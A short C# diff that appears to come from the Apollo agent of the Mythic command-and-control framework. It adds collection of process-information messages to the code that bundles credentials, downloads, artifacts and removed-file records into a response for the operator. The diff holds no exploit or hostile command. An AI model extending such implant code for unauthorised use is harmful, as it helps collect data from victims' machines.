@@ -51,6 +51,7 @@ namespace ApolloInterop.Classes
                 List<Credential> creds = new List<Credential>();
                 List<RemovedFileInformation> removed = new List<RemovedFileInformation>();
                 List<Artifact> artifacts = new List<Artifact>();
+                List<ProcessInformation> processes = new List<ProcessInformation>();
                 foreach (IMythicMessage msg in messages)
                 {
                     switch (msg.GetTypeCode())
@@ -76,6 +77,9 @@ namespace ApolloInterop.Classes
                         case MessageType.DownloadMessage:
                             resp.Download = (DownloadMessage)msg;
                             break;
+                        case MessageType.ProcessInformation:
+                            processes.Add((ProcessInformation)msg);
+                            break;
                         default:
                             throw new Exception($"Unhandled message type while generating response: {msg.GetTypeCode()}");
                     }
@@ -84,6 +88,7 @@ namespace ApolloInterop.Classes
                 resp.Credentials = creds.ToArray();
                 resp.RemovedFiles = removed.ToArray();
                 resp.Artifacts = artifacts.ToArray();
+                resp.Processes = processes.ToArray();
             }
             return resp;
         }
